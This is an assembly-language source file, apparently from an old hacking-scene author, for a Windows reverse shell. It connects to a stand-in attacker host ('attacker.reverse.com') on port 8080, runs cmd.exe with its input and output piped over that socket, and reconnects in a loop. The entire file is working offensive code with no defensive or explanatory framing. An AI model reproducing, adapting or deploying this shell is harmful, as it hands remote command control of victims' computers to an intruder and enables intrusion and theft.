; minireverse.asm
; by illwill
; feb 23,2006
; spits back a cmd shell to your ip on your defined port

.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\ws2_32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\ws2_32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib 

.data
  cmd     db "cmd",0
  UrIP    db "attacker.reverse.com",0
  port    db "8080",0
.data?
  sinfo   STARTUPINFO<>
  pi      PROCESS_INFORMATION<>
  sin     sockaddr_in<>
  WSAD    WSADATA<>
  Wsocket dd ?
.code
start:
    invoke WSAStartup, 101h, addr WSAD 
    invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0
           mov Wsocket, eax
           mov sin.sin_family, 2
    invoke atodw, addr port
    invoke htons, eax
           mov sin.sin_port, ax
    invoke gethostbyname, addr UrIP
          mov eax, [eax+12]
          mov eax, [eax]
          mov eax, [eax]
          mov sin.sin_addr, eax

          mov eax,Wsocket
          mov sinfo.hStdInput,eax
          mov sinfo.hStdOutput,eax
          mov sinfo.hStdError,eax     
          mov sinfo.cb,sizeof STARTUPINFO
          mov sinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES
 shellagain:
    invoke connect, Wsocket, addr sin , sizeof(sockaddr_in) 
    invoke CreateProcess,NULL,addr cmd,NULL,NULL,TRUE,8000040h,NULL,NULL,addr sinfo,addr pi
    invoke WaitForSingleObject,pi.hProcess,INFINITE
	jmp shellagain
 ret
end start